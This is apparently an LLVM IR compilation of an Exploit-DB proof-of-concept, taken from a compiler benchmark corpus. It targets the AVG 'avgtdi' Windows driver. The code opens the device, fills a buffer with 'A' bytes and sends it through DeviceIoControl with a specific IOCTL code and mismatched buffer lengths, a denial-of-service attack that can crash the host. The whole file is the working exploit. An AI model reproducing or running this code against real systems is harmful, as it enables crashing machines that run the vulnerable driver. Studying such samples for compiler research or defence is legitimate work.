; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_15384.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_15384.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.deviceName = private unnamed_addr constant [11 x i8] c"\\\\.\\avgtdi\00", align 1
@__const.main.logName = private unnamed_addr constant [11 x i8] c"avgtdi.log\00", align 1
@GENERIC_READ = common dso_local global i32 0, align 4
@GENERIC_WRITE = common dso_local global i32 0, align 4
@OPEN_EXISTING = common dso_local global i32 0, align 4
@INVALID_HANDLE_VALUE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [29 x i8] c"Device  succesfully opened!\0A\00", align 1
@.str.1 = private unnamed_addr constant [30 x i8] c"Error: Error opening device \0A\00", align 1
@.str.2 = private unnamed_addr constant [14 x i8] c"malloc failed\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca [11 x i8], align 1
  %13 = alloca [11 x i8], align 1
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 24, i32* %9, align 4
  store i32 16, i32* %10, align 4
  store i32 -2097143608, i32* %11, align 4
  %14 = bitcast [11 x i8]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %14, i8* align 1 getelementptr inbounds ([11 x i8], [11 x i8]* @__const.main.deviceName, i32 0, i32 0), i64 11, i1 false)
  %15 = bitcast [11 x i8]* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %15, i8* align 1 getelementptr inbounds ([11 x i8], [11 x i8]* @__const.main.logName, i32 0, i32 0), i64 11, i1 false)
  %16 = getelementptr inbounds [11 x i8], [11 x i8]* %12, i64 0, i64 0
  %17 = load i32, i32* @GENERIC_READ, align 4
  %18 = load i32, i32* @GENERIC_WRITE, align 4
  %19 = or i32 %17, %18
  %20 = load i32, i32* @OPEN_EXISTING, align 4
  %21 = call i32 @CreateFileA(i8* %16, i32 %19, i32 0, i32 0, i32 %20, i32 0, i32* null)
  store i32 %21, i32* %6, align 4
  %22 = load i32, i32* @INVALID_HANDLE_VALUE, align 4
  %23 = icmp ne i32 %21, %22
  br i1 %23, label %24, label %26

24:                                               ; preds = %2
  %25 = call i32 @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str, i64 0, i64 0))
  br label %28

26:                                               ; preds = %2
  %27 = call i32 @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.1, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %48

28:                                               ; preds = %24
  store i32 0, i32* %7, align 4
  %29 = call i8* @malloc(i32 4096)
  store i8* %29, i8** %8, align 8
  %30 = load i8*, i8** %8, align 8
  %31 = icmp ne i8* %30, null
  br i1 %31, label %34, label %32

32:                                               ; preds = %28
  %33 = call i32 @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.2, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %48

34:                                               ; preds = %28
  %35 = load i8*, i8** %8, align 8
  %36 = call i32 @memset(i8* %35, i8 signext 65, i32 4095)
  %37 = load i32, i32* %6, align 4
  %38 = load i32, i32* %11, align 4
  %39 = load i8*, i8** %8, align 8
  %40 = ptrtoint i8* %39 to i32
  %41 = load i32, i32* %10, align 4
  %42 = load i8*, i8** %8, align 8
  %43 = ptrtoint i8* %42 to i32
  %44 = load i32, i32* %9, align 4
  %45 = call i32 @DeviceIoControl(i32 %37, i32 %38, i32 %40, i32 %41, i32 %43, i32 %44, i32* %7, i32* null)
  %46 = load i8*, i8** %8, align 8
  %47 = call i32 @free(i8* %46)
  br label %48

48:                                               ; preds = %34, %32, %26
  %49 = load i32, i32* %3, align 4
  ret i32 %49
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @CreateFileA(i8*, i32, i32, i32, i32, i32, i32*) #2

declare dso_local i32 @printf(i8*) #2

declare dso_local i8* @malloc(i32) #2

declare dso_local i32 @memset(i8*, i8 signext, i32) #2

declare dso_local i32 @DeviceIoControl(i32, i32, i32, i32, i32, i32, i32*, i32*) #2

declare dso_local i32 @free(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
